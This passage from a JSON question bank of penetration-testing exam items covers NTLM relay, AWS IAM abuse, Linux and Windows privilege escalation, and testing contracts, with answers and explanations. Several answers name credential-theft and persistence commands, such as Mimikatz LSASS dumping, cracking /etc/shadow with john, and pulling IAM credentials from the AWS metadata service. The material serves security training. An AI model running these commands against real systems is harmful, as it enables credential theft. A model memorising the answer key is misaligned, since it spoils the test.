        "Attempt a brute-force attack against the NTLM hash",
        "Modify the NTLM response to bypass authentication",
        "Use the NTLM hash to request Kerberos service tickets"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If SMB signing is disabled, NTLM hashes can be relayed to authenticate without cracking. Brute-forcing NTLM hashes is slow and inefficient. Modifying NTLM responses is ineffective. Kerberos service tickets require a Kerberos attack, not NTLM.",
      "examTip": "NTLM relay attacks allow authentication without crackingâ€”check SMB signing settings first."
    },
    {
      "id": 88,
      "question": "A penetration tester is analyzing an AWS environment and finds an IAM role with `sts:AssumeRole` permissions. What is the MOST significant risk?",
      "options": [
        "An attacker can assume higher privileges within AWS",
        "The IAM role allows unrestricted access to S3 buckets",
        "AWS Lambda functions can be executed without authentication",
        "The role can be used to capture plaintext credentials from EC2 instances"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`sts:AssumeRole` allows an attacker to assume the role and gain its privileges, potentially escalating access. S3 access depends on policy configurations. AWS Lambda execution requires additional permissions. EC2 credentials are retrieved differently via metadata services.",
      "examTip": "Restrict `sts:AssumeRole` permissionsâ€”attackers can escalate AWS privileges using improperly configured roles."
    },
    {
      "id": 89,
      "question": "A penetration tester executes the following command on a Linux target:\n\n```\nfind / -type f -name '*.sh' -writable 2>/dev/null\n```\n\nWhat is the MOST likely objective?",
      "options": [
        "Identifying writable script files for privilege escalation",
        "Searching for sensitive information stored in configuration files",
        "Enumerating bash history for user credentials",
        "Detecting running processes that can be hijacked"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Finding writable shell scripts can allow an attacker to modify them and execute code with elevated privileges. Configuration files store settings, not necessarily executable scripts. Bash history contains command logs, not writable files. Running process enumeration requires `ps` or `top`.",
      "examTip": "Writable scripts executed by privileged users can be modified for privilege escalation."
    },
    {
      "id": 90,
      "question": "A major e-commerce client requires a pentest but wants to exclude certain payment systems from scope to avoid potential compliance conflicts with PCI-DSS. Which of the following BEST addresses these exclusions while maintaining a legally sound testing agreement?",
      "options": [
        "A risk acceptance statement signed only by the QA manager",
        "An explicit addendum in the Rules of Engagement detailing out-of-scope systems",
        "An internal email from the marketing team acknowledging exclusions",
        "A single bullet point in the Non-Disclosure Agreement stating no credit card data will be accessed"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The Rules of Engagement typically specifies systems that are in-scope versus out-of-scope, ensuring legal clarity about where and how tests should be conducted.",
      "examTip": "Always confirm out-of-scope systems and data in a formal, signed ROE to avoid legal or compliance complications."
    },
    {
      "id": 91,
      "question": "A penetration tester is attempting to escalate privileges on a Linux system and executes the following command:\n\n```\nsudo -u root bash\n```\n\nThe command fails. What should the tester check NEXT?",
      "options": [
        "Run `sudo -l` to check for misconfigured sudo permissions",
        "Enumerate world-writable directories for privilege escalation",
        "Attempt to brute-force the root password using a dictionary attack",
        "Check `/etc/shadow` for stored plaintext passwords"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If `sudo -u root` fails, checking `sudo -l` can reveal if specific commands can be executed as root. World-writable directories may allow privilege escalation but are not the first check. Brute-forcing root passwords is inefficient. `/etc/shadow` contains password hashes, not plaintext passwords.",
      "examTip": "Always check `sudo -l` to identify potential privilege escalation paths before trying other methods."
    },
    {
      "id": 92,
      "question": "A penetration tester gains access to a Windows system and wants to extract plaintext credentials from memory. Which of the following commands would be the MOST effective?",
      "options": [
        "`mimikatz privilege::debug sekurlsa::logonpasswords`",
        "`net user /domain`",
        "`wmic useraccount get name,sid`",
        "`reg query HKLM\\Security /f password`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`mimikatz sekurlsa::logonpasswords` extracts plaintext credentials from LSASS memory. `net user /domain` lists domain users. `wmic useraccount` retrieves user information but not credentials. Registry queries may reveal some stored passwords but not active session credentials.",
      "examTip": "LSASS memory dumping with `Mimikatz` is one of the most effective ways to extract credentials."
    },
    {
      "id": 93,
      "question": "Which of the following is the BEST technique for gaining persistence on a compromised macOS system?",
      "options": [
        "Creating a LaunchAgent that executes a malicious payload at startup",
        "Modifying the Windows registry to add a startup entry",
        "Injecting a payload into LSASS to extract stored credentials",
        "Exploiting SMB signing to perform an NTLM relay attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LaunchAgents are commonly used for persistence on macOS. Modifying the Windows registry applies to Windows. LSASS injection is a Windows-specific attack. NTLM relay attacks do not provide persistence.",
      "examTip": "macOS persistence often involves LaunchAgents, LaunchDaemons, or modifying system startup files."
    },
    {
      "id": 94,
      "question": "A penetration tester identifies that an AWS IAM role has `s3:PutObject` permissions. What is the MOST significant security risk?",
      "options": [
        "Attackers can upload malicious files to an S3 bucket",
        "Anyone can list all files stored in the bucket",
        "Privilege escalation within the AWS environment",
        "Compromised IAM credentials can be relayed to another user"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `s3:PutObject` permission allows attackers to upload malicious files or overwrite existing data. Listing files requires `s3:ListBucket`. Privilege escalation requires additional IAM misconfigurations. Credential relaying is not a common AWS attack vector.",
      "examTip": "Always check AWS S3 bucket permissionsâ€”public `PutObject` access can allow malware distribution."
    },
    {
      "id": 95,
      "question": "A penetration tester exploits an RCE vulnerability on a Linux web server and gains a low-privileged shell. What is the BEST next step to escalate privileges?",
      "options": [
        "Check for writable SUID binaries that can be exploited",
        "Modify the `/etc/passwd` file to grant root access",
        "Run `iptables -L` to enumerate firewall rules",
        "Brute-force the root password using a hash cracking tool"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Writable SUID binaries can be used for privilege escalation. Modifying `/etc/passwd` requires existing root access. Firewall rule enumeration is useful for lateral movement, not escalation. Brute-forcing root passwords is inefficient and rarely successful.",
      "examTip": "Always check for misconfigured SUID binaries when looking for Linux privilege escalation vectors."
    },
    {
      "id": 96,
      "question": "A penetration tester intercepts the following HTTP request:\n\n```\nGET /api/data HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.somerandomsignature\n```\n\nWhich of the following attacks would be the MOST effective?",
      "options": [
        "Cracking the JWT signing key to forge a new token",
        "Injecting SQL payloads to bypass authentication",
        "Brute-forcing the administrator password",
        "Exploiting an XSS vulnerability to steal the JWT token"
      ],
      "correctAnswerIndex": 0,
      "explanation": "If the JWT signing key is weak, an attacker can forge new tokens. SQL injection targets databases, not token-based authentication. Brute-force attacks do not target JWTs. XSS can steal tokens but does not exploit weak signing keys.",
      "examTip": "Use tools like `jwtcrack` to test for weak JWT signing keys."
    },
    {
      "id": 97,
      "question": "A penetration tester gains initial access to an AWS EC2 instance. Which of the following actions would provide the BEST chance of privilege escalation?",
      "options": [
        "Querying the instance metadata service for IAM credentials",
        "Running `john` to crack user account passwords",
        "Sniffing network traffic for authentication credentials",
        "Scanning for world-writable files to plant a backdoor"
      ],
      "correctAnswerIndex": 0,
      "explanation": "AWS metadata services often contain IAM role credentials, allowing attackers to escalate privileges. Cracking passwords is time-consuming and may not yield admin access. Network sniffing depends on capturing unencrypted traffic. Writable files help with persistence, not escalation.",
      "examTip": "AWS metadata services can leak IAM role credentialsâ€”check `http://169.254.169.254/latest/meta-data/`."
    },
    {
      "id": 98,
      "question": "Which of the following commands would be MOST effective for discovering user accounts with weak passwords on a Linux system?",
      "options": [
        "`john /etc/shadow`",
        "`nmap --script ssh-brute`",
        "`find / -type f -perm -4000`",
        "`cat /etc/passwd`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`john /etc/shadow` cracks Linux password hashes to identify weak passwords. `nmap --script ssh-brute` performs brute-force attacks over SSH. `find / -perm -4000` lists SUID binaries, not passwords. `/etc/passwd` contains usernames but not password hashes.",
      "examTip": "Use `john` or `hashcat` to crack password hashes and identify weak credentials."
    },
    {
      "id": 99,
      "question": "Following a penetration test engagement, the client disputes the testerâ€™s right to withhold certain proprietary scripts used during the assessment. Which of the following contractual documents or clauses would MOST LIKELY define intellectual property rights to the tools and methodologies used?",
      "options": [
        "A Non-Disclosure Agreement stating that client data cannot be shared publicly",
        "A Master Service Agreement provision addressing ownership of deliverables and tester IP",
        "An Indemnification clause describing how liability is assigned for accidental damages",
        "A Risk acceptance statement detailing the clientâ€™s responsibilities for vulnerabilities"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The MSA typically includes provisions on who owns which assets, tools, and methodologies used during testing, addressing IP rights explicitly.",
      "examTip": "Negotiate ownership clauses before the test begins to prevent disputes over intellectual property and results ownership."
    },
    {
      "id": 100,
      "question": "A large multinational client requests a pentest but is concerned about potential obligations to report any discovered criminal activity to various regulatory bodies. Which of the following is the BEST approach to address mandatory reporting requirements in a penetration testing context?",
      "options": [
        "Establish immediate public disclosure of vulnerabilities identified by the testers",
        "Ensure the Statement of Work includes a clause absolving the client from any wrongdoing",
        "Outline mandatory reporting obligations and escalation procedures explicitly within the Rules of Engagement",
        "Assume no reporting is required unless a formal government inquiry is initiated"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The Rules of Engagement should detail how to handle findings that may require legal or regulatory reporting, ensuring testers and client are aligned on mandatory disclosure obligations.",
      "examTip": "Always verify regional or industry-specific mandatory reporting requirements and document them in the ROE or contract."
    }
  ]
});
